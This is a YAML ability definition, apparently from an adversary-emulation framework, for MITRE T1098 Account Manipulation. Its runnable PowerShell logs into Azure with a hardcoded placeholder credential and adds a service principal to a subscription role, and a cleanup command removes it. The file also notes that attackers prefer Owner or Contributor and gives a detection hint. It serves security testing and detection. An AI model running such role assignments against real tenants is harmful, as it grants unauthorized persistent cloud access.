- description: "The adversaries want to add service principal to some Azure role,\
    \ also called Azure resource role. Threat actor \nmay be interested primarily\
    \ in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader\
    \ is assigned to service principal in this test.\n\nNew-AzRoleAssignment cmdlet\
    \ could be also use to assign user/service principal to resource, resource group\
    \ and management group.\n\nThe account you use to run the PowerShell command must\
    \ have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access\
    \ Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All\
    \ \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check\
    \ Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n"
  id: bac18f187778e4202196ddd3c6041d31
  name: Azure - adding service principal to Azure role in subscription
  platforms:
    unknown:
      psh:
        cleanup: Import-Module -Name AzureAD -ErrorAction Ignore; $PWord = ConvertTo-SecureString
          -String "p4sswd" -AsPlainText -Force; $Credential = New-Object -TypeName
          System.Management.Automation.PSCredential -ArgumentList "jonh@contoso.com",
          $Pword; Connect-AzAccount -Credential $Credential -ErrorAction Ignore; $sp
          = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq "SuperSP"};
          if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit };
          $subscription = Get-AzSubscription | where-object {$_.Name -eq "Azure subscription
          1"} ; if ($subscription -eq $null) { Write-Warning "Subscription not found";
          exit }; $role = Get-AzRoleDefinition | where-object {$_.Name -eq "Reader"};
          if ($role -eq $null) { Write-Warning "Role not found"; exit }; Remove-AzRoleAssignment
          -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription;
          Write-Host "Service Principal $($sp.DisplayName) was removed from $($role.Name)
          role in subscriptions $($subscriptions.Name)"
        command: try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue)
          { ; } else {Install-Module -Name Az.Resources -Force};  ;  Import-Module
          -Name Az.Resources; $PWord = ConvertTo-SecureString -String "p4sswd" -AsPlainText
          -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential
          -ArgumentList "jonh@contoso.com", $Pword; Connect-AzAccount -Credential
          $Credential; $sp = Get-AzADServicePrincipal | where-object {$_.DisplayName
          -eq "SuperSP"}; if ($sp -eq $null) { Write-Warning "Service Principal not
          found"; exit }; $subscription = Get-AzSubscription | where-object {$_.Name
          -eq "Azure subscription 1"} ; if ($subscription -eq $null) { Write-Warning
          "Subscription not found"; exit }; $role = Get-AzRoleDefinition | where-object
          {$_.Name -eq "Reader"}; if ($role -eq $null) { Write-Warning "Role not found";
          exit }; New-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id
          -Scope /subscriptions/$subscription; Write-Host "Service Principal $($sp.DisplayName)
          was added to $($role.Name) role in subscriptions $($subscriptions.Name)"
        parsers:
          plugins.atomic.app.parsers.atomic_powershell:
          - source: validate_me
        payloads: []
  tactic: multiple
  technique:
    attack_id: T1098
    name: Account Manipulation
